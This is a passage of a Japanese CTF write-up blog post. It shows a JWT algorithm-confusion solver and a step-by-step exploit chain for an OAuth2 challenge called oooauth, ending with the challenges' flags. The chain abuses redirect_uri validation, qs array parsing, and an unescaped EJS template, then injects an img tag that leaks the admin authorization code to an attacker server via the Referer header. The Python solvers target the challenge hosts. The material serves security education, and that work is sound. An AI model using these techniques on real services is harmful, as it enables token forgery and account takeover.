+</span></span></span><span style=display:flex><span><span style=color:#e6db74>xO2kJIXugy9h9pNAX8jlNHNQWT1WM5HI3t8aMcsucjOT9wTWh7Hl0qxrO4f7f2kP
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>HODGSRQ/uR9czPYtXP4HPAPUToZ9Xzc5Voj3Q/bzRcAnkKH6fmUOtLPd2XhTDTFl
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>A5kHBxj92CnlYq6/bQdXDy0CAwEAAQ==
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>-----END PUBLIC KEY-----
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#39;&#39;&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    forged_jwt <span style=color:#f92672>=</span> jwt<span style=color:#f92672>.</span>encode(payload, pubkey, algorithm<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;HS256&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    headers <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Authorization&#34;</span>: forged_jwt<span style=color:#f92672>.</span>decode(),
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Content-Type&#34;</span>: <span style=color:#e6db74>&#34;application/json&#34;</span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    flag_response <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>post(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>url<span style=color:#e6db74>}</span><span style=color:#e6db74>/flag&#39;</span>, headers<span style=color:#f92672>=</span>headers)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> flag_response<span style=color:#f92672>.</span>status_code <span style=color:#f92672>!=</span> <span style=color:#ae81ff>200</span>:
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Get flag request failed: </span><span style=color:#e6db74>{</span>flag_response<span style=color:#f92672>.</span>status_code<span style=color:#e6db74>}</span><span style=color:#e6db74>, </span><span style=color:#e6db74>{</span>flag_response<span style=color:#f92672>.</span>text<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>        sys<span style=color:#f92672>.</span>exit()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> flag_response<span style=color:#f92672>.</span>text
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    flag <span style=color:#f92672>=</span> solve(<span style=color:#e6db74>&#34;https://double-check.beginners.seccon.games&#34;</span>)
+</span></span><span style=display:flex><span>    print(flag) 
+</span></span></code></pre></div><pre tabindex=0><code>$ python3 solver.py
+Congratulations! Here&#39;s your flag: ctf4b{Pr0707yp3_P0llU710n_f0R_7h3_w1n}
+</code></pre><h1 id=oooauth難易度-hard>oooauth（難易度 Hard）</h1><p>OAuth2.0の実装上生まれる複数の脆弱性を連鎖的に悪用する問題です。</p><p>OAuth2.0の詳細については<a href=https://www.rfc-editor.org/rfc/rfc6749>RFC 6749</a>を参照してください。</p><p><code>client/index.js</code>がclientの実装、<code>server/index.js</code>がauthorization serverの実装となっています。</p><p><code>guest</code>と<code>admin</code>の2人のユーザーが存在しており、<code>guest</code>のパスワードのみわかる状態です。<code>admin</code>のアクセストークンを取得できるとflagが得られます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#34;/flag&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>access_token_value</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>access_token</span>;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>access_token</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>access_tokens</span>[<span style=color:#a6e22e>access_token_value</span>];
+</span></span><span style=display:flex><span>  ...
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>user</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>getUserById</span>(<span style=color:#a6e22e>access_token</span>.<span style=color:#a6e22e>user_id</span>);
+</span></span><span style=display:flex><span>  ...
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>username</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;admin&#34;</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>200</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>`Congratulations! Here&#39;s your flag: </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>FLAG</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
+</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>200</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;No flag for you&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>});
+</span></span></code></pre></div><p><code>server/index.js</code>の<code>/auth</code>の実装を見ると<code>redirect_uri</code>の検証部分が不適切であり、任意のクエリパラメータを含めることが可能だと分かります。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>client</span>.<span style=color:#a6e22e>redirect_uris</span>.<span style=color:#a6e22e>includes</span>(<span style=color:#a6e22e>redirectUrl</span>.<span style=color:#a6e22e>origin</span><span style=color:#f92672>+</span><span style=color:#a6e22e>redirectUrl</span>.<span style=color:#a6e22e>pathname</span>)) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;invalid_request&#34;</span>, <span style=color:#a6e22e>error_description</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;invalid redirect_uri&#34;</span> });
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>また、<code>server/index.js</code>の<code>/approve</code>では<code>/auth</code>からセッション経由で引き継がれた<code>redirect_uri</code>にクエリパラメータとして認可コード<code>code</code>が追加され、そのURLにリダイレクトがなされます。認可コードは<code>/token</code>においてアクセストークンとの交換に使用されます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>redirect_uri</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>session</span>.<span style=color:#a6e22e>redirect_uri</span>;
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span><span style=color:#a6e22e>redirectUrl</span>.<span style=color:#a6e22e>searchParams</span>.<span style=color:#a6e22e>append</span>(<span style=color:#e6db74>&#34;code&#34;</span>, <span style=color:#a6e22e>code</span>.<span style=color:#a6e22e>value</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>redirect</span>(<span style=color:#a6e22e>redirectUrl</span>.<span style=color:#a6e22e>href</span>);
+</span></span></code></pre></div><p><code>server/index.js</code>では<code>app.use(bodyParser.urlencoded({ extended: true }));</code>が設定されており、リクエストボディの解析に<code>qs</code>ライブラリが使用されるため、リクエストボディとして送信するオブジェクトが柔軟に操作できます。また、<code>server/index.js</code>の<code>/token</code>ではリクエストボディとして送信される<code>code</code>の値が配列の場合に、配列の最後の要素がアクセストークンとの交換に使用され、削除されます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>codeValue</span> <span style=color:#f92672>=</span> Array.<span style=color:#a6e22e>isArray</span>(<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>code</span>)<span style=color:#f92672>?</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>code</span>.<span style=color:#a6e22e>slice</span>(<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>:</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>code</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>code</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>codes</span>.<span style=color:#a6e22e>get</span>(<span style=color:#a6e22e>codeValue</span>);
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span><span style=color:#a6e22e>codes</span>.<span style=color:#66d9ef>delete</span>(<span style=color:#a6e22e>code</span>.<span style=color:#a6e22e>value</span>);
+</span></span></code></pre></div><p>そして、authorization serverのReport機能を用いると<code>server/index.js</code>の<code>/auth</code>エンドポイントにクエリパラメータを付与して送信することができ、リダイレクト先の同意画面にて<code>admin</code>のユーザー名とパスワードが入力され送信されます。つまり、ここでは<code>admin</code>用に認可コードが発行され、アクセストークンとの交換に使用するために消費されます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#66d9ef>goto</span>(<span style=color:#a6e22e>SERVER_URL</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;/auth&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>query</span>, {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>waitUntil</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;networkidle2&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>timeout</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>3000</span>, 
+</span></span><span style=display:flex><span>}); 
+</span></span><span style=display:flex><span><span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>waitForSelector</span>(<span style=color:#e6db74>&#34;input[name=username]&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>type</span>(<span style=color:#e6db74>&#34;input[name=username]&#34;</span>, <span style=color:#a6e22e>USERNAME</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>type</span>(<span style=color:#e6db74>&#34;input[name=password]&#34;</span>, <span style=color:#a6e22e>PASSWORD</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>click</span>(<span style=color:#e6db74>&#34;input[name=approved]&#34;</span>);
+</span></span></code></pre></div><p>ここで、<code>guest</code>用に発行された認可コードを<code>redirect_uri</code>のクエリパラメータ<code>code</code>として送信し、<code>admin</code>用に発行された認可コードを消費させないことを考えます。この場合、通常は後からクエリパラメータとして追加される<code>admin</code>用に発行された<code>code</code>が配列の最後の要素となります。</p><pre tabindex=0><code>&gt; qs.parse(&#39;code=guest-code&amp;code=admin-code&#39;)
+{ code: [ &#39;guest-code&#39;, &#39;admin-code&#39; ] }
+</code></pre><p>しかし、以下のようにすると<code>guest</code>用に発行された<code>code</code>を配列の最後の要素にすることができます。これで<code>guest</code>用に発行された認可コードを消費させ、<code>admin</code>用に発行された認可コードを消費させないことが可能となりました。あとは、flagを得るためにURLのクエリパラメータに含まれる<code>admin</code>用に発行された認可コードを窃取する必要があります。</p><pre tabindex=0><code>&gt; qs.parse(&#39;code[2]=guest-code&amp;code=hoge&amp;code=admin-code&#39;)
+{ code: [ &#39;hoge&#39;, &#39;admin-code&#39;, &#39;guest-code&#39; ] }
+</code></pre><p>ここで<code>client/views/index.ejs</code>では<code>scope</code>の値の表示に<code>&lt;%- %></code>が使用されており、値がエスケープされずに表示される（<a href=https://github.com/mde/ejs#features>参考</a>）ことに気づきます。</p><pre tabindex=0><code class=language-:.ejs data-lang=:.ejs>&lt;% if(scopes) { %&gt;
+    &lt;p&gt;Your Permissions:&lt;/p&gt;
+    &lt;ul&gt;
+        &lt;% scopes.forEach(function(scope) { %&gt;
+            &lt;li&gt;&lt;%- scope %&gt;&lt;/li&gt;
+        &lt;% }); %&gt;
+    &lt;/ul&gt;
+&lt;% }; %&gt;
+</code></pre><p><code>client/index.js</code>ではCSPが設定されており、XSSでURLを窃取することは難しそうです。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>use</span>(<span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>, <span style=color:#a6e22e>next</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#75715e>// CSP Setting
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>nonce</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>crypto</span>.<span style=color:#a6e22e>randomBytes</span>(<span style=color:#ae81ff>8</span>).<span style=color:#a6e22e>toString</span>(<span style=color:#e6db74>&#34;hex&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>nonce</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>nonce</span>; 
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>setHeader</span>(<span style=color:#e6db74>&#34;Content-Security-Policy&#34;</span>, <span style=color:#e6db74>`script-src &#39;nonce-</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>nonce</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;; connect-src &#39;self&#39;; base-uri &#39;self&#39;; object-src &#39;none&#39;;`</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>next</span>();
+</span></span><span style=display:flex><span>});
+</span></span></code></pre></div><p>しかし、<code>index.ejs</code>に<code>&lt;meta name="referrer" content="no-referrer-when-downgrade"></code>が設定されており、このページから遷移した際の<code>Referer</code>ヘッダにクエリパラメータを含む遷移元のURLが送信されます（<a href=https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Referrer-Policy>参考</a>）。HTMLインジェクションは可能であるため、<code>img</code>タグなどを<code>src</code>に自身のサーバに設定した上で挿入すると<code>Referer</code>ヘッダ経由でURLを窃取することができます。</p><p>最終的に以下のスクリプトを用いて生成したクエリパラメータをReport機能で送信することで、<code>admin</code>用に発行された認可コードを得ることができます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.py data-lang=:.py><span style=display:flex><span><span style=color:#f92672>import</span> requests
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> re
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> urllib
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> json
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> time
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>solve</span>():
+</span></span><span style=display:flex><span>    CLIENT_URL <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;https://oooauth.beginners.seccon.games:3000&#34;</span>
+</span></span><span style=display:flex><span>    SERVER_URL <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;https://oooauth.beginners.seccon.games:3001&#34;</span>
+</span></span><span style=display:flex><span>    ATTACKER_URL <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;自身のサーバのURL&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    s <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>Session()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    auth_params <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;response_type&#34;</span>: <span style=color:#e6db74>&#34;code&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;client_id&#34;</span>: <span style=color:#e6db74>&#34;oauth-client&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;scopes&#34;</span>: <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;&lt;img/src=&#34;</span><span style=color:#e6db74>{</span>ATTACKER_URL<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;&gt;&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;redirect_uri&#34;</span>: <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>CLIENT_URL<span style=color:#e6db74>}</span><span style=color:#e6db74>/callback&#39;</span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    auth_response <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>get(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>SERVER_URL<span style=color:#e6db74>}</span><span style=color:#e6db74>/auth&#34;</span>, params<span style=color:#f92672>=</span>auth_params)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    approve_data <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;approved&#34;</span>: <span style=color:#e6db74>&#34;true&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;username&#34;</span>: <span style=color:#e6db74>&#34;guest&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;password&#34;</span>: <span style=color:#e6db74>&#34;guest&#34;</span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    approve_response <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>post(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>SERVER_URL<span style=color:#e6db74>}</span><span style=color:#e6db74>/approve&#34;</span>, data<span style=color:#f92672>=</span>approve_data, allow_redirects<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
+</span></span><span style=display:flex><span>    match <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;code=([0-9a-f]</span><span style=color:#e6db74>{32}</span><span style=color:#e6db74>)&#39;</span>, approve_response<span style=color:#f92672>.</span>text)
+</span></span><span style=display:flex><span>    guest_code <span style=color:#f92672>=</span> match<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    auth_params <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;response_type&#34;</span>: <span style=color:#e6db74>&#34;code&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;client_id&#34;</span>: <span style=color:#e6db74>&#34;oauth-client&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;scopes&#34;</span>: <span style=color:#e6db74>&#34;email profile&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;redirect_uri&#34;</span>: <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>CLIENT_URL<span style=color:#e6db74>}</span><span style=color:#e6db74>/callback?code[2]=</span><span style=color:#e6db74>{</span>guest_code<span style=color:#e6db74>}</span><span style=color:#e6db74>&amp;code=hoge&#34;</span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    fishing_query <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>parse<span style=color:#f92672>.</span>urlencode(auth_params)
+</span></span><span style=display:flex><span>    print(fising_query)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    solve()
+</span></span></code></pre></div><p><img src=/images/posts/36/writeup_code.png alt=admin_code></p><p>あとは、<code>admin</code>用に発行された認可コードを使用してアクセストークンを取得することでflagを得ます。</p><p><img src=/images/posts/36/writeup_admin.png alt=admin></p><pre tabindex=0><code>Congratulations! Here&#39;s your flag: ctf4b{J00_4re_7HE_vUlN_cH41n_m457eR_0F_04U7H}
+</code></pre></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/ctf>ctf</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/melonattacker title=GitHub><i data-feather=github></i></a>
+<a class=border></a><a class=soc href=https://x.com/melonattacker title=X><i data-feather=x></i></a>
+<a class=border></a></div><div class=footer-info>2025 © yuasa | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
